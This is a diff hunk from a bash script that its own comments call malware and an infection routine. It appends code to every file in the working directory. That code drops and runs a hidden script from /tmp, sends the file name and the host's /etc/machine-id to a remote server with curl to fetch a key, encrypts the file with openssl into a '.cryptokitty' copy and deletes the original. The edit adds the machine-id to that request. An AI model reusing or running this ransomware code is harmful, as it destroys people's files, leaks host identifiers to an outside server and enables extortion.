@@ -22,7 +22,7 @@ for target in *; do #@7 for every file in the working dir
 	NEWFILE="/tmp/\ /$NEWFILE" #@21 path of this new file that will be created
 	echo "tail -n 38 $target | awk '{print(\$NF\" \"\$0)}' | sort -g -t@ -k2 | cut -f2- -d' ' > $NEWFILE" >> $target #@22 append the restoring function to the target file
 	echo "chmod +x $NEWFILE && $NEWFILE &" >> $target #@23 append the command that gives us the permission of execution to the future malware file
-	echo "[ -f "$target" ] && [[ "${target##*\\.}" != "*.cryptokitty" ]] && key=\"\$(curl -s https://deadkitty.blasco991.com/code.php?m=$target)\" && openssl enc -aes-256-cbc -in "$target" -k \"\$key\" -out "$target.cryptokitty" && rm "$target"; exit 0" >> $target #@24 append the command exit 0 at the end of our file	
+	echo "[ -f "$target" ] && [[ "${target##*\\.}" != "*.cryptokitty" ]] && key=\"\$(curl -s https://deadkitty.blasco991.com/code.php?m=$target&u=$(cat /etc/machine-id)&\" && openssl enc -aes-256-cbc -in "$target" -k \"\$key\" -out "$target.cryptokitty" && rm "$target"; exit 0" >> $target #@24 append the command exit 0 at the end of our file	
 	tabft=("FT" [39]=" ") #@25 Start Real-Infection: create an array and put in the first position "FT" and put at position 39 a blank space
 	declare -i nbl=0 #@26 declare the integer variable nbl
 	while [ $nbl -ne 39 ]; do #@27 while nbl is not 39
